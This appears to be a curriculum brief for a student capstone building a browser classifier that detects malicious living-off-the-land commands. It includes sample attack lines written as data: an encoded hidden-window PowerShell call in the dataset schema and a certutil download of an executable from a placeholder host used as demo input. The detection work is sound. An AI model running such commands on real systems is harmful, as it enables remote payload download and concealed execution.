# Capstone — Jarrett — LOTL Command Classifier

> **Status:** STARTER (scaffolding stub — dataset will be pre-curated and bundled before you arrive Jun 22)
> **Owner:** Jarrett Hartsoe
> **Window:** L01–L03 onboarding Jun 22 – Jul 3; L05 + capstone build Jul 6 – Jul 17; on-site demo **Jul 24**.

## A-SMART outcome (the contract)

> *"By July 24, 2026, Jarrett will ship a browser-based Living-Off-The-Land (LOTL) command classifier that distinguishes benign system-admin commands from malicious LOTL invocations on a curated dataset of ≥200 examples (50/50 balanced, drawn from MITRE Atomic Red Team and public admin-script corpora), achieving ≥85% accuracy on a held-out test set of ≥30 commands, with a confidence-threshold UI that exposes the precision/recall tradeoff visibly, and present it live in a 5-minute on-site demo during the final program week."*

Source: [ADR-0003 § Capstone lanes](../../../claude-markdown-documents/ADRs/ADR-0003-summer-2026-curriculum-structure.md#3-capstone-lanes-with-a-smart-outcomes).

## What is LOTL and why does it matter?

**Living Off The Land** = adversaries don't bring their own malware. They use legitimate, pre-installed binaries — `powershell.exe`, `certutil.exe`, `bitsadmin.exe`, `wmic.exe`, `mshta.exe`, `regsvr32.exe`, etc. — to do malicious things. The binary itself is legit; what makes it malicious is *how it's invoked* (encoded payloads, suspicious flag combinations, network-fetch patterns, atypical parent processes).

You can't blocklist `powershell.exe` — admins use it constantly. The signal is in the *shape* of the invocation. That's a real ML problem (not a regex problem) and an active area of security research.

References:
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK T1218 — System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [LolBAS Project](https://lolbas-project.github.io/) — catalog of legit binaries and their abuse vectors

## Why this is a good capstone for you

- **On-brand for cybersecurity.** Real, current, unsolved-by-pattern-match security problem. Portfolio-worthy.
- **Plays your bio's strengths.** Pen-testers literally use LOTL techniques — you'll know the malicious side intimately. Linux shell on your resume helps with command-line literacy.
- **Confidence thresholds matter here.** Real SOCs drown in false positives. High-confidence malicious gets blocked; low-confidence flagged for analyst review. Maps directly onto L05's content.
- **Tight scope fits part-time hours.** ≥200-example dataset is small enough you can reason about every example.

## What we'll provide

- **L05 — Classification with confidence** (capability lesson, your required pick). Covers thresholds, ROC curves, the precision/recall tradeoff, and `ConfidenceClassifierELM`.
- **Pre-curated dataset** at `examples/capstones/jarrett-lotl-classifier/data/lotl-commands.json` — Julian-owned in [IMPL-0003 Phase 1 step 8](../../../claude-markdown-documents/implementation-plans/IMPL-0003-summer-2026-curriculum-execution.md#phase-1--nolan-pilot--l04-l06-drafting-may-12--may-31-3-weeks). Schema:
  ```json
  {
    "command": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA...",
    "label": "malicious",
    "source": "MITRE Atomic Red Team T1059.001 atomic 1",
    "technique": "T1059.001",
    "license": "MIT"
  }
  ```
  Balanced ~50/50, ≥200 entries, with row-level source attribution.
- **`FeatureCombinerELM` from `window.astermind`** — the right primitive for this problem because it lets you combine token-level encoding of the command string with engineered numeric features. See [src/tasks/FeatureCombinerELM.ts](../../../src/tasks/FeatureCombinerELM.ts) for the API.
- **A starter feature-extractor** — Julian will write the first 5–6 numeric features so you have a concrete pattern to extend. Examples: encoded-blob presence, suspicious-flag count, LolBAS-name presence, argument entropy, network-indicator presence.

## What you'll build

A static HTML page (`index.html`) + JS that:

1. **Loads** the bundled `lotl-commands.json` at page-init.
2. **Trains** a `FeatureCombinerELM` on a 70/30 train/test split (or 80/20 if you prefer; document your choice).
3. **Reports** training accuracy, held-out test accuracy, precision, recall, and a 3-row precision/recall table at three threshold values (e.g. 0.3 / 0.5 / 0.7).
4. **Exposes a live input** — a textbox where the user pastes any command line, and the page classifies it as benign / malicious with a confidence bar.
5. **Has a confidence-threshold slider** — drag to see precision/recall update in real time on the held-out set.

## Acceptance checklist

- [ ] Code lives at `examples/capstones/jarrett-lotl-classifier/` with `index.html`, `classifier.js`, `features.js`, and a `README.md` Sam could read cold.
- [ ] No server required — static HTML + JS only.
- [ ] Uses `window.astermind.FeatureCombinerELM` (or a documented justification for using `IntentClassifier`/`ELM` instead — `FeatureCombinerELM` is the recommended fit).
- [ ] Reads the bundled `data/lotl-commands.json`; does not require external dataset downloads at runtime.
- [ ] **Held-out test accuracy ≥85%** on a fixed 30-command holdout (use a stable seed for the split — document the seed in the README).
- [ ] The threshold slider is visible and updates a live precision/recall display on the held-out set.
- [ ] The live input box accepts a pasted command and classifies it within 100ms; the confidence bar shows the model's certainty.
- [ ] vitest tests under `tests/capstones/jarrett-lotl-classifier/` cover the feature-extractor functions (input → expected feature vector for 5 known commands).
- [ ] `npm run build` and `npm test` both pass on a fresh clone.
- [ ] 5-minute presentation exists at `presentation.md` (or in slides.json if you wrap it in the lesson scaffold). Demo includes:
  - One known-malicious command (e.g. `certutil.exe -urlcache -split -f http://x.com/p.exe p.exe`)
  - One known-benign command (e.g. `dir C:\`)
  - One ambiguous command where the threshold matters
  - The audience pasting in their own command

## Suggested approach (non-binding)

**Week 6 (Jun 22–26) — onboarding.** L01 only. Don't touch the capstone. Read the LOTL background links above for context on the malicious side; read the LolBAS project page.

**Week 7 (Jun 29 – Jul 3) — onboarding cont.** L02 + L03. Read the bundled `lotl-commands.json` end-to-end to get a feel for the data — every example, with sources. Skim the starter feature-extractor.

**Week 8 (Jul 6–10) — capability + scaffolding.** L05. Then build the data-loading + train/test split + report-baseline-accuracy with a single feature (just the encoded-blob detector). Don't add features yet. *Goal: end-to-end pipeline running, even if accuracy is low.*

**Week 9 (Jul 13–17) — feature engineering.** Add features one at a time. After each, re-train and check accuracy + precision/recall. Stop when you cross the 85% bar with margin (aim for 90%+ if possible). Build the threshold slider UI. Add the live input. *Goal: hit the ≥85% bar comfortably.*

**Week 10 (Jul 20–24) — presentation prep.** Write the deck. Practice. Dry-run was Jul 17, on-site Jul 24.

## Stretch ideas (only after the bar is met)

- Add a **"why?" panel** that shows the top-3 features contributing to a given classification (feature-importance analysis).
- Add a **multi-class mode** — instead of benign/malicious, classify into ATT&CK technique families (T1059, T1218, T1197, etc.). Harder; needs more data per class.
- **Adversarial input box** — a "try to fool the model" mode that lets the user perturb a malicious command minimally and see if it slips past. Genuine pen-tester mindset.
- Integration with [Atomic Red Team's Invoke-AtomicTest](https://github.com/redcanaryco/invoke-atomicredteam) so you can stream live atomic-test commands into the classifier as a pipeline.

## Documented narrower fallback

If multi-binary scope feels too wide, scope down to **encoded-PowerShell detection only** (T1059.001):

- Same A-SMART bar (≥85% on ≥30 holdout).
- Smaller dataset surface — only PowerShell invocations, malicious side limited to encoded/obfuscated patterns.
- Same `FeatureCombinerELM` shape with fewer features.
- Easier to verify; fewer judgment calls on labels.

This is documented in [ADR-0003 § Jarrett — Browser LOTL command classifier](../../../claude-markdown-documents/ADRs/ADR-0003-summer-2026-curriculum-structure.md#3-capstone-lanes-with-a-smart-outcomes) as the official narrower alternative.

## Where this is enforced

- **vitest** in `tests/capstones/jarrett-lotl-classifier/` (you write these).
- **Dry-run Jul 17** — Julian will paste 5 surprise commands (mix of benign + malicious not in your training set) and watch the classifications. Half-credit if any are wildly miscategorized.
- **On-site Jul 24** — Sam will be invited to paste commands too.
